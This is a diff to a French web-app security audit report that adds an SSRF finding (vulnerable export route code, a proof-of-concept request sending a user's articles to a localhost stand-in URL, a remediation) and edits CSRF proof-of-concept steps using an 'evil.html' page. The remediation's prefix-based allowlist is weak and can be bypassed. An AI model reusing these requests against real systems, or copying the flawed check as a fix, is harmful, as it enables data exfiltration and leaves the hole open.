@@ -337,7 +337,7 @@ safeContent = DOMPurify.sanitize(article.value.content)
 
 ### 3.7. Cross-Site Request Forgery (CSRF)
 
-- **Localisation :** le middleware de session dans `backend/src/index.ts`
+- **Localisation :** Le middleware de session dans `backend/src/index.ts`
     ```ts
   app.use(session({
   store: new SQLiteStore({
@@ -354,8 +354,9 @@ safeContent = DOMPurify.sanitize(article.value.content)
 
 - **Preuve de concept :**
     1. Démarrer l’application : npm run setup puis npm run dev.
-    2. Lancer le fichier [evil.html](evil.html) sur le navigateur (CORS allégés avec le bon port qui va bien)
-    3. On observe que le script s'exécute bien et fait un POST avec un cookie qui n'est pas strict.
+    2. Se connecter dans le navigateur.
+    3. Lancer le fichier [evil.html](evil.html) sur le navigateur (CORS allégés avec le bon port qui va bien)
+    4. On observe que le script s'exécute bien et fait un POST avec un cookie qui n'est pas strict.
 
 ![cookie-samesite-no.png](screenshots/cookie-samesite-no.png)
 
@@ -386,3 +387,53 @@ safeContent = DOMPurify.sanitize(article.value.content)
 ---
 
 ### 3.8. Server‑Side Request Forgery (SSRF)
+
+- **Localisation :** La route `/api/articles/export` `backend/src/controllers/articles.ts`
+  ```ts
+  export async function exportData(req: Request, res: Response): Promise<any> {
+  let sendTo: string
+  try {
+  sendTo = (new URL(req.query.to as string)).toString()
+  } catch (error) {
+  return res.sendStatus(400)
+  }
+  
+  const userId = req.session.user!.id;
+  let articles = await db.all('SELECT * FROM articles WHERE authorId = ?', userId);
+  articles = articles.map(article => ({
+  id: article.id,
+  title: article.title
+  }))
+  
+  await fetch(sendTo, {
+  method: 'POST',
+  body: JSON.stringify(articles),
+  headers: { 'Content-Type': 'application/json' }
+  })
+  
+  res.sendStatus(200)
+  }
+   ```
+
+- **Preuve de concept :**
+  1. Démarrer l’application : npm run setup puis npm run dev. 
+  2. Se connecter dans Postman.
+  3. Appeler la route export :
+  ```ts
+  GET http://localhost:3000/api/articles/export?to=http://localhost:4000/test
+   ```
+  4. Le serveur local reçoit un POST avec la liste des articles (même si là rien n'est lancé), preuve que l’URL fournie est utilisée sans contrôle.
+
+![fetch server.png](screenshots/fetch%20server.png)
+
+- **Cause :**
+  - La route `/api/articles/export` envoie les données vers l’URL passée en paramètre, sans restrictions
+
+- **Remédiation :**
+  - Restreindre l’URL sendTo à une liste blanche de domaines connus :
+  ```ts
+  const allowedHosts = ['https://mon-service.com'];
+  if (!allowedHosts.some(h => sendTo.startsWith(h))) {
+  return res.status(400).json({ error: 'Forbidden target' });
+  }
+   ```
